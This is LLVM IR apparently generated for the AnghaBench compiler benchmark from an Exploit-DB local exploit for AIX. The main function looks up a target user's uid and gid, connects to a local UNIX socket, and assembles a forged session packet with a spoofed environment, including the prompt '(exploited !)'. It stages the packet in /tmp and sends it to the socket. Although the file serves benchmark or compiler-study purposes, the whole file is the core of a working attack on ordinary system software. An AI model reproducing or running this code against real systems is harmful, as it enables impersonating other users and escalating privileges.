; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/aix/local/extr_19287.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/aix/local/extr_19287.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_un = type { i8*, i32 }
%struct.hostent = type { i32 }
%struct.passwd = type { i8*, i8*, i32, i32 }
%struct.sockaddr = type { i32 }

@TAILLE_BUFFER = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [7 x i8] c"\0A\0A%s\0A\0A\00", align 1
@KOPY = common dso_local global i8* null, align 8
@.str.1 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@NOUSER = common dso_local global i8* null, align 8
@UNKNOWN = common dso_local global i8* null, align 8
@.str.2 = private unnamed_addr constant [15 x i8] c"/tmp/tempo.fun\00", align 1
@.str.3 = private unnamed_addr constant [3 x i8] c"wb\00", align 1
@AF_UNIX = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@SOCK_PATH = common dso_local global i8* null, align 8
@.str.4 = private unnamed_addr constant [8 x i8] c"connect\00", align 1
@.str.5 = private unnamed_addr constant [13 x i8] c"%c%c%c%c%c%c\00", align 1
@.str.6 = private unnamed_addr constant [5 x i8] c"%c%c\00", align 1
@.str.7 = private unnamed_addr constant [8 x i8] c"DISPLAY\00", align 1
@.str.8 = private unnamed_addr constant [19 x i8] c"%c%c%c%c%c%c%c%c%c\00", align 1
@PWD = common dso_local global i8* null, align 8
@.str.9 = private unnamed_addr constant [9 x i8] c"%c%c%c%c\00", align 1
@.str.10 = private unnamed_addr constant [14 x i8] c"_=./startinfo\00", align 1
@.str.11 = private unnamed_addr constant [12 x i8] c"TMPDIR=/tmp\00", align 1
@.str.12 = private unnamed_addr constant [8 x i8] c"LANG=%s\00", align 1
@.str.13 = private unnamed_addr constant [5 x i8] c"LANG\00", align 1
@.str.14 = private unnamed_addr constant [9 x i8] c"LOGIN=%s\00", align 1
@.str.15 = private unnamed_addr constant [11 x i8] c"NLSPATH=%s\00", align 1
@.str.16 = private unnamed_addr constant [8 x i8] c"NLSPATH\00", align 1
@.str.17 = private unnamed_addr constant [8 x i8] c"PATH=%s\00", align 1
@.str.18 = private unnamed_addr constant [5 x i8] c"PATH\00", align 1
@.str.19 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.20 = private unnamed_addr constant [13 x i8] c"EDITOR=emacs\00", align 1
@.str.21 = private unnamed_addr constant [11 x i8] c"LOGNAME=%s\00", align 1
@.str.22 = private unnamed_addr constant [24 x i8] c"MAIL=/usr/spool/mail/%s\00", align 1
@.str.23 = private unnamed_addr constant [12 x i8] c"HOSTNAME=%s\00", align 1
@.str.24 = private unnamed_addr constant [9 x i8] c"HOSTNAME\00", align 1
@.str.25 = private unnamed_addr constant [11 x i8] c"LOCPATH=%s\00", align 1
@.str.26 = private unnamed_addr constant [8 x i8] c"LOCPATH\00", align 1
@.str.27 = private unnamed_addr constant [19 x i8] c"PS1=(exploited !) \00", align 1
@.str.28 = private unnamed_addr constant [8 x i8] c"USER=%s\00", align 1
@.str.29 = private unnamed_addr constant [13 x i8] c"AUTHSTATE=%s\00", align 1
@.str.30 = private unnamed_addr constant [10 x i8] c"AUTHSTATE\00", align 1
@.str.31 = private unnamed_addr constant [11 x i8] c"DISPLAY=%s\00", align 1
@.str.32 = private unnamed_addr constant [9 x i8] c"SHELL=%s\00", align 1
@.str.33 = private unnamed_addr constant [6 x i8] c"SHELL\00", align 1
@.str.34 = private unnamed_addr constant [21 x i8] c"ODMDIR=/etc/objrepos\00", align 1
@.str.35 = private unnamed_addr constant [8 x i8] c"HOME=%s\00", align 1
@.str.36 = private unnamed_addr constant [11 x i8] c"TERM=vt220\00", align 1
@.str.37 = private unnamed_addr constant [28 x i8] c"MAILMSG=[YOU HAVE NEW MAIL]\00", align 1
@.str.38 = private unnamed_addr constant [7 x i8] c"PWD=%s\00", align 1
@.str.39 = private unnamed_addr constant [9 x i8] c"TZ=NFT-1\00", align 1
@.str.40 = private unnamed_addr constant [15 x i8] c"A__z=! LOGNAME\00", align 1
@.str.41 = private unnamed_addr constant [3 x i8] c"rb\00", align 1
@SEEK_END = common dso_local global i32 0, align 4
@SEEK_SET = common dso_local global i32 0, align 4
@.str.42 = private unnamed_addr constant [8 x i8] c"\0A%s %s\0A\00", align 1
@OK = common dso_local global i8* null, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca %struct.sockaddr_un, align 8
  %6 = alloca %struct.sockaddr_un, align 8
  %7 = alloca %struct.hostent*, align 8
  %8 = alloca %struct.passwd*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i64, align 8
  %16 = alloca i64, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i8*, align 8
  %19 = alloca i32*, align 8
  %20 = alloca i8*, align 8
  %21 = alloca i8*, align 8
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %24 = load i32, i32* @TAILLE_BUFFER, align 4
  %25 = zext i32 %24 to i64
  %26 = call i8* @llvm.stacksave()
  store i8* %26, i8** %14, align 8
  %27 = alloca i8, i64 %25, align 16
  store i64 %25, i64* %15, align 8
  %28 = load i32, i32* @TAILLE_BUFFER, align 4
  %29 = zext i32 %28 to i64
  %30 = alloca i8, i64 %29, align 16
  store i64 %29, i64* %16, align 8
  %31 = load i8*, i8** @KOPY, align 8
  %32 = call i32 (i8*, i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i64 0, i64 0), i8* %31)
  %33 = load i32, i32* %3, align 4
  %34 = icmp ne i32 %33, 2
  br i1 %34, label %35, label %39

35:                                               ; preds = %2
  %36 = load i8*, i8** @NOUSER, align 8
  %37 = call i32 (i8*, i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.1, i64 0, i64 0), i8* %36)
  %38 = call i32 @exit(i32 1) #4
  unreachable

39:                                               ; preds = %2
  %40 = load i8**, i8*** %4, align 8
  %41 = getelementptr inbounds i8*, i8** %40, i64 1
  %42 = load i8*, i8** %41, align 8
  %43 = call %struct.passwd* @getpwnam(i8* %42)
  store %struct.passwd* %43, %struct.passwd** %8, align 8
  %44 = load %struct.passwd*, %struct.passwd** %8, align 8
  %45 = icmp ne %struct.passwd* %44, null
  br i1 %45, label %50, label %46

46:                                               ; preds = %39
  %47 = load i8*, i8** @UNKNOWN, align 8
  %48 = call i32 (i8*, i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.1, i64 0, i64 0), i8* %47)
  %49 = call i32 @exit(i32 1) #4
  unreachable

50:                                               ; preds = %39
  %51 = load %struct.passwd*, %struct.passwd** %8, align 8
  %52 = getelementptr inbounds %struct.passwd, %struct.passwd* %51, i32 0, i32 0
  %53 = load i8*, i8** %52, align 8
  store i8* %53, i8** %20, align 8
  %54 = load %struct.passwd*, %struct.passwd** %8, align 8
  %55 = getelementptr inbounds %struct.passwd, %struct.passwd* %54, i32 0, i32 1
  %56 = load i8*, i8** %55, align 8
  store i8* %56, i8** %21, align 8
  %57 = load %struct.passwd*, %struct.passwd** %8, align 8
  %58 = getelementptr inbounds %struct.passwd, %struct.passwd* %57, i32 0, i32 2
  %59 = load i32, i32* %58, align 8
  store i32 %59, i32* %22, align 4
  %60 = load %struct.passwd*, %struct.passwd** %8, align 8
  %61 = getelementptr inbounds %struct.passwd, %struct.passwd* %60, i32 0, i32 3
  %62 = load i32, i32* %61, align 4
  store i32 %62, i32* %23, align 4
  %63 = call i32* @fopen(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.2, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i64 0, i64 0))
  store i32* %63, i32** %19, align 8
  %64 = load i32, i32* @AF_UNIX, align 4
  %65 = load i32, i32* @SOCK_STREAM, align 4
  %66 = call i32 @socket(i32 %64, i32 %65, i32 0)
  store i32 %66, i32* %9, align 4
  %67 = load i32, i32* @AF_UNIX, align 4
  %68 = getelementptr inbounds %struct.sockaddr_un, %struct.sockaddr_un* %5, i32 0, i32 1
  store i32 %67, i32* %68, align 8
  %69 = getelementptr inbounds %struct.sockaddr_un, %struct.sockaddr_un* %5, i32 0, i32 0
  %70 = load i8*, i8** %69, align 8
  %71 = load i8*, i8** @SOCK_PATH, align 8
  %72 = call i32 @strcpy(i8* %70, i8* %71)
  store i32 16, i32* %12, align 4
  %73 = load i32, i32* %9, align 4
  %74 = bitcast %struct.sockaddr_un* %5 to %struct.sockaddr*
  %75 = load i32, i32* %12, align 4
  %76 = call i64 @connect(i32 %73, %struct.sockaddr* %74, i32 %75)
  %77 = icmp slt i64 %76, 0
  br i1 %77, label %78, label %81

78:                                               ; preds = %50
  %79 = call i32 @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.4, i64 0, i64 0))
  %80 = call i32 @exit(i32 1) #4
  unreachable

81:                                               ; preds = %50
  %82 = load i32, i32* %22, align 4
  %83 = ashr i32 %82, 8
  %84 = load i32, i32* %22, align 4
  %85 = load i32, i32* %22, align 4
  %86 = ashr i32 %85, 8
  %87 = mul nsw i32 %86, 256
  %88 = sub nsw i32 %84, %87
  %89 = call i32 (i8*, i8*, ...) @sprintf(i8* %27, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.5, i64 0, i64 0), i32 0, i32 0, i32 %83, i32 %88, i32 0, i32 0)
  %90 = load i32*, i32** %19, align 8
  %91 = call i32 @fwrite(i8* %27, i32 1, i32 6, i32* %90)
  %92 = load i32, i32* %23, align 4
  %93 = ashr i32 %92, 8
  %94 = load i32, i32* %23, align 4
  %95 = load i32, i32* %23, align 4
  %96 = ashr i32 %95, 8
  %97 = mul nsw i32 %96, 256
  %98 = sub nsw i32 %94, %97
  %99 = call i32 (i8*, i8*, ...) @sprintf(i8* %27, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i64 0, i64 0), i32 %93, i32 %98)
  %100 = load i32*, i32** %19, align 8
  %101 = call i32 @fwrite(i8* %27, i32 1, i32 2, i32* %100)
  %102 = load i32, i32* @TAILLE_BUFFER, align 4
  %103 = call i32 @bzero(i8* %27, i32 %102)
  %104 = call i8* @getenv(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i64 0, i64 0))
  %105 = call i32 @strcpy(i8* %27, i8* %104)
  %106 = load i32*, i32** %19, align 8
  %107 = call i32 @fwrite(i8* %27, i32 1, i32 259, i32* %106)
  %108 = call i32 (i8*, i8*, ...) @sprintf(i8* %27, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.8, i64 0, i64 0), i32 1, i32 67, i32 0, i32 0, i32 0, i32 0, i32 0, i32 0, i32 0)
  %109 = load i32*, i32** %19, align 8
  %110 = call i32 @fwrite(i8* %27, i32 1, i32 9, i32* %109)
  %111 = load i8*, i8** %20, align 8
  %112 = load i32*, i32** %19, align 8
  %113 = call i32 @send_environ(i8* %111, i32* %112)
  %114 = load i8*, i8** %21, align 8
  %115 = load i32*, i32** %19, align 8
  %116 = call i32 @send_environ(i8* %114, i32* %115)
  %117 = load i8*, i8** %21, align 8
  %118 = load i32*, i32** %19, align 8
  %119 = call i32 @send_environ(i8* %117, i32* %118)
  %120 = load i8*, i8** @PWD, align 8
  %121 = load i32*, i32** %19, align 8
  %122 = call i32 @send_environ(i8* %120, i32* %121)
  %123 = call i32 (i8*, i8*, ...) @sprintf(i8* %27, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.9, i64 0, i64 0), i32 23, i32 0, i32 0, i32 0)
  %124 = load i32*, i32** %19, align 8
  %125 = call i32 @fwrite(i8* %27, i32 1, i32 4, i32* %124)
  %126 = call i32 (i8*, i8*, ...) @sprintf(i8* %27, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.10, i64 0, i64 0))
  %127 = load i32*, i32** %19, align 8
  %128 = call i32 @send_environ(i8* %27, i32* %127)
  %129 = call i32 (i8*, i8*, ...) @sprintf(i8* %27, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.11, i64 0, i64 0))
  %130 = load i32*, i32** %19, align 8
  %131 = call i32 @send_environ(i8* %27, i32* %130)
  %132 = call i8* @getenv(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.13, i64 0, i64 0))
  %133 = call i32 (i8*, i8*, ...) @sprintf(i8* %27, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.12, i64 0, i64 0), i8* %132)
  %134 = load i32*, i32** %19, align 8
  %135 = call i32 @send_environ(i8* %27, i32* %134)
  %136 = load i8*, i8** %21, align 8
  %137 = call i32 (i8*, i8*, ...) @sprintf(i8* %27, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.14, i64 0, i64 0), i8* %136)
  %138 = load i32*, i32** %19, align 8
  %139 = call i32 @send_environ(i8* %27, i32* %138)
  %140 = call i8* @getenv(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.16, i64 0, i64 0))
  %141 = call i32 (i8*, i8*, ...) @sprintf(i8* %27, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.15, i64 0, i64 0), i8* %140)
  %142 = load i32*, i32** %19, align 8
  %143 = call i32 @send_environ(i8* %27, i32* %142)
  %144 = call i8* @getenv(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.18, i64 0, i64 0))
  %145 = call i32 (i8*, i8*, ...) @sprintf(i8* %27, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.17, i64 0, i64 0), i8* %144)
  %146 = load i32*, i32** %19, align 8
  %147 = call i32 @send_environ(i8* %27, i32* %146)
  %148 = call i32 (i8*, i8*, ...) @sprintf(i8* %27, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.19, i64 0, i64 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.20, i64 0, i64 0))
  %149 = load i32*, i32** %19, align 8
  %150 = call i32 @send_environ(i8* %27, i32* %149)
  %151 = load i8*, i8** %21, align 8
  %152 = call i32 (i8*, i8*, ...) @sprintf(i8* %27, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.21, i64 0, i64 0), i8* %151)
  %153 = load i32*, i32** %19, align 8
  %154 = call i32 @send_environ(i8* %27, i32* %153)
  %155 = load i8*, i8** %21, align 8
  %156 = call i32 (i8*, i8*, ...) @sprintf(i8* %27, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.22, i64 0, i64 0), i8* %155)
  %157 = load i32*, i32** %19, align 8
  %158 = call i32 @send_environ(i8* %27, i32* %157)
  %159 = call i8* @getenv(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.24, i64 0, i64 0))
  %160 = call i32 (i8*, i8*, ...) @sprintf(i8* %27, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.23, i64 0, i64 0), i8* %159)
  %161 = load i32*, i32** %19, align 8
  %162 = call i32 @send_environ(i8* %27, i32* %161)
  %163 = call i8* @getenv(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.26, i64 0, i64 0))
  %164 = call i32 (i8*, i8*, ...) @sprintf(i8* %27, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.25, i64 0, i64 0), i8* %163)
  %165 = load i32*, i32** %19, align 8
  %166 = call i32 @send_environ(i8* %27, i32* %165)
  %167 = call i32 (i8*, i8*, ...) @sprintf(i8* %27, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.19, i64 0, i64 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.27, i64 0, i64 0))
  %168 = load i32*, i32** %19, align 8
  %169 = call i32 @send_environ(i8* %27, i32* %168)
  %170 = load i8*, i8** %21, align 8
  %171 = call i32 (i8*, i8*, ...) @sprintf(i8* %27, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.28, i64 0, i64 0), i8* %170)
  %172 = load i32*, i32** %19, align 8
  %173 = call i32 @send_environ(i8* %27, i32* %172)
  %174 = call i8* @getenv(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.30, i64 0, i64 0))
  %175 = call i32 (i8*, i8*, ...) @sprintf(i8* %27, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.29, i64 0, i64 0), i8* %174)
  %176 = load i32*, i32** %19, align 8
  %177 = call i32 @send_environ(i8* %27, i32* %176)
  %178 = call i8* @getenv(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i64 0, i64 0))
  %179 = call i32 (i8*, i8*, ...) @sprintf(i8* %27, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.31, i64 0, i64 0), i8* %178)
  %180 = load i32*, i32** %19, align 8
  %181 = call i32 @send_environ(i8* %27, i32* %180)
  %182 = call i8* @getenv(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.33, i64 0, i64 0))
  %183 = call i32 (i8*, i8*, ...) @sprintf(i8* %27, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.32, i64 0, i64 0), i8* %182)
  %184 = load i32*, i32** %19, align 8
  %185 = call i32 @send_environ(i8* %27, i32* %184)
  %186 = call i32 (i8*, i8*, ...) @sprintf(i8* %27, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.19, i64 0, i64 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.34, i64 0, i64 0))
  %187 = load i32*, i32** %19, align 8
  %188 = call i32 @send_environ(i8* %27, i32* %187)
  %189 = load i8*, i8** %20, align 8
  %190 = call i32 (i8*, i8*, ...) @sprintf(i8* %27, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.35, i64 0, i64 0), i8* %189)
  %191 = load i32*, i32** %19, align 8
  %192 = call i32 @send_environ(i8* %27, i32* %191)
  %193 = call i32 (i8*, i8*, ...) @sprintf(i8* %27, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.19, i64 0, i64 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.36, i64 0, i64 0))
  %194 = load i32*, i32** %19, align 8
  %195 = call i32 @send_environ(i8* %27, i32* %194)
  %196 = call i32 (i8*, i8*, ...) @sprintf(i8* %27, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.19, i64 0, i64 0), i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.37, i64 0, i64 0))
  %197 = load i32*, i32** %19, align 8
  %198 = call i32 @send_environ(i8* %27, i32* %197)
  %199 = load i8*, i8** @PWD, align 8
  %200 = call i32 (i8*, i8*, ...) @sprintf(i8* %27, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.38, i64 0, i64 0), i8* %199)
  %201 = load i32*, i32** %19, align 8
  %202 = call i32 @send_environ(i8* %27, i32* %201)
  %203 = call i32 (i8*, i8*, ...) @sprintf(i8* %27, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.19, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.39, i64 0, i64 0))
  %204 = load i32*, i32** %19, align 8
  %205 = call i32 @send_environ(i8* %27, i32* %204)
  %206 = call i32 (i8*, i8*, ...) @sprintf(i8* %27, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.19, i64 0, i64 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.40, i64 0, i64 0))
  %207 = load i32*, i32** %19, align 8
  %208 = call i32 @send_environ(i8* %27, i32* %207)
  %209 = call i32 (i8*, i8*, ...) @sprintf(i8* %27, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.9, i64 0, i64 0), i32 1, i32 45, i32 113, i32 0)
  %210 = load i32*, i32** %19, align 8
  %211 = call i32 @fwrite(i8* %27, i32 1, i32 4, i32* %210)
  %212 = load i32*, i32** %19, align 8
  %213 = call i32 @fclose(i32* %212)
  %214 = call i32* @fopen(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.2, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.41, i64 0, i64 0))
  store i32* %214, i32** %19, align 8
  %215 = load i32*, i32** %19, align 8
  %216 = load i32, i32* @SEEK_END, align 4
  %217 = call i32 @fseek(i32* %215, i32 0, i32 %216)
  %218 = load i32*, i32** %19, align 8
  %219 = call i32 @ftell(i32* %218)
  store i32 %219, i32* %13, align 4
  %220 = load i32*, i32** %19, align 8
  %221 = load i32, i32* @SEEK_SET, align 4
  %222 = call i32 @fseek(i32* %220, i32 0, i32 %221)
  %223 = load i32, i32* %13, align 4
  %224 = load i32*, i32** %19, align 8
  %225 = call i32 @fread(i8* %30, i32 1, i32 %223, i32* %224)
  %226 = load i32*, i32** %19, align 8
  %227 = call i32 @fclose(i32* %226)
  %228 = call i32 @unlink(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.2, i64 0, i64 0))
  %229 = load i32, i32* %9, align 4
  %230 = load i32, i32* %13, align 4
  %231 = call i32 @write(i32 %229, i8* %30, i32 %230)
  %232 = load i8*, i8** @OK, align 8
  %233 = call i8* @getenv(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.24, i64 0, i64 0))
  %234 = call i32 (i8*, i8*, ...) @printf(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.42, i64 0, i64 0), i8* %232, i8* %233)
  %235 = load i32, i32* %9, align 4
  %236 = call i32 @close(i32 %235)
  %237 = load i8*, i8** %14, align 8
  call void @llvm.stackrestore(i8* %237)
  ret i32 0
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @printf(i8*, i8*, ...) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local %struct.passwd* @getpwnam(i8*) #2

declare dso_local i32* @fopen(i8*, i8*) #2

declare dso_local i32 @socket(i32, i32, i32) #2

declare dso_local i32 @strcpy(i8*, i8*) #2

declare dso_local i64 @connect(i32, %struct.sockaddr*, i32) #2

declare dso_local i32 @perror(i8*) #2

declare dso_local i32 @sprintf(i8*, i8*, ...) #2

declare dso_local i32 @fwrite(i8*, i32, i32, i32*) #2

declare dso_local i32 @bzero(i8*, i32) #2

declare dso_local i8* @getenv(i8*) #2

declare dso_local i32 @send_environ(i8*, i32*) #2

declare dso_local i32 @fclose(i32*) #2

declare dso_local i32 @fseek(i32*, i32, i32) #2

declare dso_local i32 @ftell(i32*) #2

declare dso_local i32 @fread(i8*, i32, i32, i32*) #2

declare dso_local i32 @unlink(i8*) #2

declare dso_local i32 @write(i32, i8*, i32) #2

declare dso_local i32 @close(i32) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
